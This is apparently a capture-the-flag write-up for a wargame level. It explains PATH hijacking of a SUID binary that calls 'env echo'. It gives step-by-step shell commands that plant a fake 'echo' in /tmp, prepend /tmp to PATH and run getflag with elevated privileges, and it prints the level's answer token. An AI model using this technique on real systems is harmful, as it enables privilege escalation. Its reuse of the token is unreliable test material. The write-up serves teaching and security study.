# Level03 - Path Hijacking Exploit

## Challenge Overview
Level03 presents a binary executable with SUID (Set User ID) permissions that runs with the privileges of `flag03`. Our goal is to exploit this binary to execute `getflag` with elevated permissions.

## Binary Analysis

### File Permissions
```
-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03
```

Key observations:
- The `s` in the owner permissions indicates SUID bit is set
- The binary runs with `flag03` privileges when executed
- It's owned by `flag03` but executable by level03 users

### Binary Content Analysis
To analyze the binary, we can use the `strings` command to extract human-readable strings from the binary:
```bash
strings level03 > level03.txt
```
Looking at the binary, we can identify:
- A call to `system()` function
- References to `setresgid` and `setresuid` (privilege management functions)
- A critical string: `/usr/bin/env echo Exploit me`

## Vulnerability Explanation
The binary executes a command using `system()` that uses env to locate and run the `echo` command. When env is called, it searches for commands in directories listed in the `PATH` environment variable.

The vulnerability lies in the fact that we can manipulate the `PATH` variable to make the program execute our own version of `echo` instead of the system's version.

## The PATH Environment Variable
`PATH` is a colon-separated list of directories that the system searches when executing commands. For example:
```
PATH=/usr/local/bin:/usr/bin:/bin
```

When we use `export PATH=/tmp:$PATH`, we're:
1. Prepending tmp to the existing PATH
2. Making this modified PATH available to child processes
3. Ensuring the system looks in tmp first when searching for executables

## Exploitation Steps

### 1. Create a malicious `echo` script
```bash
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
```

This script will execute `getflag` with `flag03` privileges when called.

### 2. Modify PATH to prioritize our script
```bash
export PATH=/tmp:$PATH
```

This makes the system search in tmp first when looking for executables.

### 3. Execute the vulnerable program
```bash
./level03
```

### 4. Result
When executed, the binary will:
1. Run with `flag03` privileges due to SUID
2. Attempt to execute `/usr/bin/env echo Exploit me`
3. env will search for `echo` in the PATH
4. Find and execute our malicious `echo` script in tmp
5. Our script will run `getflag` with `flag03` privileges
6. The flag for the next level will be displayed

## Security Lessons
1. **Path Hijacking**: Always use absolute paths in privileged programs
2. **SUID Binaries**: Be extremely cautious with SUID executables that call other programs without specifying full paths
3. **Environment Variables**: Remember that environment variables like PATH can be manipulated by users

## Complete Solution
```bash
# Create malicious echo script
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo

# Modify PATH
export PATH=/tmp:$PATH

# Run the vulnerable program
./level03

# Expected output: Check flag.Here is your token: qi0maab88jeaj46qoumi7maus
```

This attack technique is known as "PATH hijacking" and is a common privilege escalation method in Unix/Linux environments.